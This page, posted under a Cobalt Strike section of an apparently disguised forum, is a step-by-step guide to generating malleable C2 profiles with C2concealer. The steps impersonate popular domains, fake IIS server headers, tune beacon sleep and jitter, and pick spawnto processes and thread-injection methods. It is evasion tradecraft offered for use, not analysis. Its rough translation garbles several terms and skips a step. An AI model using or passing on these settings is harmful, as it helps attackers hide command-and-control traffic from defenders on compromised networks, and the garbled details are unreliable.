@@ -1,0 +1,119 @@
+    Vampir
+    New Topics
+    New replies
+
+    Start
+    Help
+    Search
+    Profile
+    Private Messages
+    Members
+
+Monica Bellucci Fan Club
+
+    Monica Bellucci Fan Club "
+    Frameworks "
+    Cobalt Strike "
+    Generation of unique profiles
+
+Generation of unique profiles
+asdf7f814vycfas - 1 - 27
+" previous topic next topic "
+
+Pages: 1
+asdf7f814vycfas
+
+    Users
+    Member
+    *
+        2
+        View Profile E-mail Personal Message (Offline)
+
+: Mar 01, 2021, 04:38:57 pm
+Written by
+
+https://fortynorthsecurity.com/blog/introducing-c2concealer
+https://github.com/FortyNorthSecurity/C2concealer
+https://bluescreenofjeff.com/2017-08-30-randomized-malleable-c2-profiles-made-easy
+
+1. Pour on the server with c2concealer cobalt timeserver
+2. Go to the folder c2concealer
+3. Give permissions to the installation script:
+   -chmod u+x install.sh
+5. Install ./install.sh
+6. Generate profile, for this choose any known domain, for example amazon.com
+Then you have options either to generate a single profile, as everyone has done before, or variable, i.e. for each rising listener you can choose different profiles.
+
+Generation of a single profile:
+   -C2concealer --hostname google.com --variant 1
+Where "--variant 1" the number of options in profile, developers do not recommend to change this parameter more than "5". In SSL settings choose keystore and set path to our stock file (cobalt folder) and profile is ready and it will appear in c2concealer folder.
+
+Download and edit.
+
+set sleeptime "5000"; Slip time in this context = 5s
+set jitter "10"; Flicker can be set from 0 to 50 any number in principle
+set host_stage "true"; Add the value
+--------------------
+set dns_idle "188.122.161.205"; Gives a random dns for bicon dns, you can set any open dns IP 8.8.8.8
+set dns_ttl "20"; Change to 20c
+--------------------
+Replace with
+
+http-config {
+header "Server" "apache";
+}
+
+
+On (header values can be set as your own)
+
+http-config {
+set headers "Server, Content-Type, Cache-Control, Connection, X-Powered-By";
+header "Server" "Microsoft-IIS/8.5";
+header "Cache-Control" "max-age=1";
+header "Connection" "keep-alive";
+header "X-Powered-By" "ASP.NET;
+set trust_x_forwarded_for "true";
+--------------------
+set spawnto_x86 "%windir%\\\syswow64\\\wusa.exe"; Replace with the process you want to jump to after spawning
+set spawnto_x64 "%windir%\\\sysnative\\\\wusa.exe"; Replace with the process you want to jump to after spawning
+--------------------
+Replace with
+
+execute {
+CreateThread;
+RtlCreateUserThread;
+CreateRemoteThread;
+
+At
+
+execute {
+CreateThread;
+CreateRemoteThread;
+RtlCreateUserThread;
+
+--------------------
+
+Be sure to check before you start:
+
+./c2lint profilename.profile
+
+Of the errors there should only be this:
+
+[%] [OPSEC] .host_stage is true. Your Beacon payload is available to anyone that connects to your server to request it. Are you OK with this?
+[!] .code-signer.keystore is missing. Will not sign executables and DLLs
+
+Pages: 1
+
+    Monica Bellucci Fan Club "
+    Frameworks "
+    Cobalt Strike "
+    Generation of unique profiles
+
+Go to:
+ 
++ Quick Reply
+
+    SMF 2.0.18 | SMF © 2020, Simple Machines
+    Developed with SychO
+
+
